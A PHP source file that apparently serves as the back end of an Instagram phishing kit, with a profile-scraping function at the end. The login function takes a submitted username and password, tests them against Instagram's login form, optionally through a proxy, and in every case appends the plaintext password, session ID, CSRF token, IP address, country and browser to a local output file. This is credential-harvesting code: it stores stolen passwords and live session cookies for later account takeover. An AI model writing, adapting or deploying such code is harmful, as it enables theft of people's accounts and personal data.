<?php

function GetUserBrowser() {
    if(strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE)
       $browser = 'Internet explorer';
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) //For Supporting IE 11
        $browser = 'Internet explorer';
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE)
       $browser = 'Mozilla Firefox';
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE)
       $browser = 'Google Chrome';
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== FALSE)
       $browser = "Opera Mini";
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE)
       $browser = "Opera";
     elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE)
       $browser = "Safari";
     else
       $browser = 'Unknown';
       
     return $browser;
}

function newUserGetCountry($ip) {
    $xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip);
    return $xml->geoplugin_countryCode;
}

function GetUserIPAddress($ip = NULL, $deep_detect = TRUE) {
    // We can get their IP from the function above, and their country from the ip_info() function to insert into the database
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    return $ip;
}

function login($user, $pass, $proxyUser, $proxyPass, $proxy)
{
    $username = $user;
    $password = $pass;

    if ($proxy != '') {
        $explode = explode(':', $proxy);
        $proxy_port = $explode[1];

        $proxy_id = 'http://'.$proxy;

        $proxyUsername = $proxyUser;
        $proxyPassword = $proxyPass;
    }

    // this is for request header

    $useragent = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334";
    $cookie = $username . ".txt";

    // this code is only for a cookie because we will need it after getting response header

    $file_location = dirname(__FILE__) . "/cookie";
    array_map('unlink', array_filter((array) array_merge(glob($file_location . "/*"))));

    //  this is our curl request url

    $url = "https://www.instagram.com/accounts/login/?force_classic_login";

    $ch = curl_init();

    $arrSetHeaders = [
        "User-Agent: $useragent",
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: deflate, br',
        'Connection: keep-alive',
        'cache-control: max-age=0'
    ];

    curl_setopt($ch, CURLOPT_HTTPHEADER, $arrSetHeaders);
    curl_setopt($ch, CURLOPT_URL, $url);
    // this code make cookie at our local folder
    curl_setopt($ch, CURLOPT_COOKIEJAR, $file_location . "/" . $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $file_location . "/" . $cookie);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    if ($proxy != '') {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_id);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $page = curl_exec($ch);
    curl_close($ch);

    // this is the main thing to the proper login

    // try to find the actual login form

    if (!preg_match('/<form data-encrypt method="POST" id="login-form" class="adjacent".*?<\/form>/is', $page, $form)) {
        //die('Failed to find log in form!');
        return 'failed';
    }

    $form = $form[0];

    // find the action of the login form

    if (!preg_match('/action="([^"]+)"/i', $form, $action)) {
        //die('Failed to find login form url');
        return 'failed';
    }

    $url2 = $action[1]; // this is our new post url

    // find all hidden fields which we need to send with our login, this includes security tokens

    $count = preg_match_all('/<input type="hidden"\s*name="([^"]*)"\s*value="([^"]*)"/i', $form, $hiddenFields);
    $postFields = [];

    // turn the hidden fields into an array

    for ($i = 0; $i < $count; ++$i) {
        $postFields[$hiddenFields[1][$i]] = $hiddenFields[2][$i];
    }

    // add our login values

    $postFields['username'] = $username;
    $postFields['password'] = $password;
    $post = '';

    // here we make the query to send instagram server for login reqponse header

    // convert to string, this won't work as an array, form will not accept multipart/form-data, only application/x-www-form-urlencoded

    foreach ($postFields as $key => $value) {
        $post .= $key . '=' . urlencode($value) . '&';
    }

    $post = substr($post, 0, -1);
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $page, $matches);
    $cookieFileContent = '';

    foreach ($matches[1] as $item) {
        $cookieFileContent .= "$item; ";
    }

    $cookieFileContent = rtrim($cookieFileContent, '; ');
    $cookieFileContent = str_replace('sessionid=; ', '', $cookieFileContent);
    $oldContent = file_get_contents($file_location . "/" . $cookie);
    $oldContArr = explode("\n", $oldContent);

    if (count($oldContArr)) {
        foreach ($oldContArr as $k => $line) {
            if (strstr($line, '# ')) {
                unset($oldContArr[$k]);
            }
        }

        $newContent = implode("\n", $oldContArr);
        $newContent = trim($newContent, "\n");

        // this code store the required update cookie details on file

        file_put_contents(
            $file_location . "/" . $cookie,
            $newContent
        );
    }

    // Now we have all things which are needed to do login, therefore we can send the second request for login with cookie data, csrftoken.

    $arrSetHeaders = [
        'origin: https://www.instagram.com',
        'authority: www.instagram.com',
        'upgrade-insecure-requests: 1',
        'Host: www.instagram.com',
        "User-Agent: $useragent",
        'content-type: application/x-www-form-urlencoded',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: deflate, br',
        "Referer: $url",
        //"X-Instagram-AJAX: 1",
        "X-Requested-With: XMLHttpRequest",
        "Cookie: $cookieFileContent",
        //'Cookie2: $Version=1',
        'Connection: keep-alive',
        'cache-control: max-age=0'
    ];

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_COOKIEJAR, $file_location . "/" . $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $file_location . "/" . $cookie);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    if ($proxy != '') {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_id);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $arrSetHeaders);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

    sleep(0.1);

    $page = curl_exec($ch);

    $pageCookies = $page;

    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $page, $matches);

    $cookies = [];

    foreach ($matches[1] as $item) {
        parse_str($item, $cookie1);
        $cookies = array_merge($cookies, $cookie1);
    }

    // "rollout_hash":"

    $rollout_ = explode('"rollout_hash":"', $page);

    //var_dump($pageCookies);


    if (sizeof($rollout_) > 1) {
        $rollout_hash = explode('",', $rollout_[1]);

        $roll_out_hash = $rollout_hash[0];

        // get csrftoken

        $set_cookie = explode('set-cookie: csrftoken=', $page);

        $get_cookie_val = explode(';', $set_cookie[1]);

        $csrftoken = $get_cookie_val[0];

        //$get_cookie_val2 = explode(';', $set_cookie[2]);
        //$csrftoken2 = $get_cookie_val2[0];

        // get session

        $set_session = explode('set-cookie: sessionid=', $page);
        $get_session_val = explode(';', $set_session[1]);
        $session = $get_session_val[0];
        curl_close($ch);

        // this code unlick cookie file which is genrating in this duration, becuase of our security
        array_map('unlink', array_filter((array) array_merge(glob($file_location . "/*"))));

        // Check to see if we are logged in
        if (strpos($page, 'Log in &mdash; Instagram') !== false) {

            $array = array('username' => $username, 'password' => $password, 'sessionid' => $session, 'crsftoken' => $csrftoken, 'date' => date('Y-m-d H:i:s'), 'IP' => GetUserIPAddress(), 'country' => newUserGetCountry(GetUserIPAddress()), 'browser' => GetUserBrowser(), 'loginSuccess' => false);

            // Write to file
            $text = json_encode($array)."\n";
            $filename = "output.txt";
            $fh = fopen($filename, "a");
            fwrite($fh, $text);
            fclose($fh);

            return 'wrong attempted';
        } else {

            $array = array('username' => $username, 'password' => $password, 'sessionid' => $session, 'crsftoken' => $csrftoken, 'date' => date('Y-m-d H:i:s'), 'IP' => GetUserIPAddress(), 'country' => newUserGetCountry(GetUserIPAddress()), 'browser' => GetUserBrowser(), 'loginSuccess' => true);

            // Write to file
            $text = json_encode($array)."\n";
            $filename = "output.txt";
            $fh = fopen($filename, "a");
            fwrite($fh, $text);
            fclose($fh);

            // This is where i put it
            return 'success';
        }
    } else {
    array_map('unlink', array_filter((array) array_merge(glob($file_location . "/*"))));
        $array = array('username' => $username, 'password' => $password, 'sessionid' => $session, 'crsftoken' => $csrftoken, 'date' => date('Y-m-d H:i:s'), 'IP' => GetUserIPAddress(), 'country' => newUserGetCountry(GetUserIPAddress()), 'browser' => GetUserBrowser(), 'loginSuccess' => false);

        // Write to file
        $text = json_encode($array)."\n";
        $filename = "output.txt";
        $fh = fopen($filename, "a");
        fwrite($fh, $text);
        fclose($fh);
        return 'failed';
    }
}

//  now we successfully login into instagram

// this function get data of pages which are open as json source format

function curl_load_general($url, $proxy = null, $arrSetHeaders = null, $data = null)
{
    if ($proxy != '') {
        $explode = explode(':', $proxy);
        $proxy_port = $explode[1];

        $proxy_id = 'http://'.$proxy;

        $proxyUsername = $proxyUser;
        $proxyPassword = $proxyPass;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 35);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 35);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $response = curl_exec($ch);
    $shards = explode('window._sharedData = ', $response);
    $insta_json = explode(';</script>', $shards[1]);
    $insta_array = json_decode($insta_json[0], true);
    curl_close($ch);
    return $insta_array;
}

function user_post($user_name, $proxy = null)
{
    // get users' page details such as users' posts and users' title detail (follower, following etc..)

    $url = 'https://www.instagram.com/' . $user_name . '/';

    // this funtion is for curl request

    $results_array = curl_load_general($url, $proxy); // this return a json of resquest urls' page

    // echo'<pre>';

    // print_r($results_array);

    // echo'</pre>';

    $limit = 15; // provide the limit thats important because one page only give some images then load more have to be clicked

    $user_post_array = [];

    $user_detail_array = [];

    if (!empty($results_array)) {
        for ($i = $limit; $i >= 0; $i--) {
            if (array_key_exists($i, $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["edge_owner_to_timeline_media"]["edges"])) {
                $latest_array = $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["edge_owner_to_timeline_media"]["edges"][$i]["node"];

                $shortcode = $latest_array['shortcode'];
                $timestamp = $latest_array['taken_at_timestamp'];
                $video = $latest_array['is_video'];
                $media_type = $video == '1' ? '2' : '1';
                $likes = $latest_array['edge_liked_by']['count'];
                $comments = $latest_array['edge_media_to_comment']['count'];
                $views = @$latest_array['video_view_count'];
                $post_url = $latest_array['display_url'];

                if ($latest_array['is_video'] == '1') {
                    $status = $latest_array['video_view_count'];
                } else {
                    $status = '';
                }

                // $link = "https://www.instagram.com/p/".$latest_array['shortcode']."/";

                $user_post_array['user_post_detail'][] = [
                    'pk' => $latest_array['id'],
                    'code' => $shortcode,
                    'timestamp' => $timestamp,
                    'media_type' => $media_type,
                    'like_count' => $likes,
                    'comment_count' => $comments,
                    'views' => @$status,
                    'taken_at' => $latest_array['taken_at_timestamp'],
                    'caption' => @$latest_array['edge_media_to_caption']['edges'][0]['node']['text'],
                    'post_img' => $post_url,
                    'user_pk' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['id'],
                    'is_private' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['is_private'],
                    'username' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['username'],
                    'full_name' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['full_name'],
                    'profile_pic_url' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['profile_pic_url'],
                ];

                $user_detail_array['user_detail'] = [
                    'id' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["id"],
                    'full_name' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["full_name"],
                    'username' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["username"],
                    'bio' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["biography"],
                    'profile_pic_url' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]['profile_pic_url'],
                    'is_private' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["is_private"],
                    'followers' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["edge_followed_by"]["count"],
                    'following' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["edge_follow"]["count"],
                    'post' => $results_array['entry_data']['ProfilePage'][0]["graphql"]["user"]["edge_owner_to_timeline_media"]['count'],
                ];
            }
        }
    }

    return array_merge($user_detail_array, $user_post_array);
}

?>
